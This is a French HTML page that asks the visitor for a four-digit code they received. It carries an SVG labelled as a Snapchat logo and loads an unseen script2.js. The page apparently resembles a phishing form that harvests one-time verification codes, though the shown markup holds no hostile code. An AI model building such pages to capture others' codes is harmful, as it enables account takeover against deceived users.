<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Code reçu</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="logo-section">
            <svg class="snapchat-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2c5.523 0 10 4.477 10 10 0 5.523-4.477 10-10 10S2 17.523 2 12 6.477 2 12 2zm0 1.5c-4.695 0-8.5 3.805-8.5 8.5s3.805 8.5 8.5 8.5 8.5-3.805 8.5-8.5-3.805-8.5-8.5-8.5z" fill="none" stroke="currentColor" stroke-width="1.5"/>
                <circle cx="9" cy="11" r="1.5" fill="currentColor"/>
                <circle cx="15" cy="11" r="1.5" fill="currentColor"/>
                <path d="M12 15c1-1 2.5-1.5 3-1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" fill="none"/>
            </svg>
        </div>

        <h1>Code reçu</h1>
        <p class="subtitle">Entrez le code que vous avez reçu.</p>

        <form id="codeForm" class="form">
            <div class="form-group">
                <label for="code">
                    <span class="icon code-icon">🔐</span>
                    Code reçu
                </label>
                <input 
                    type="text" 
                    id="code" 
                    name="code" 
                    placeholder="0000" 
                    maxlength="4" 
                    required
                >
            </div>

            <button type="submit" class="btn-continue">Envoyer le code</button>
        </form>

        <div id="statusMessage" class="status-message"></div>
    </div>

    <script src="script2.js?v=1"></script>
</body>
</html>
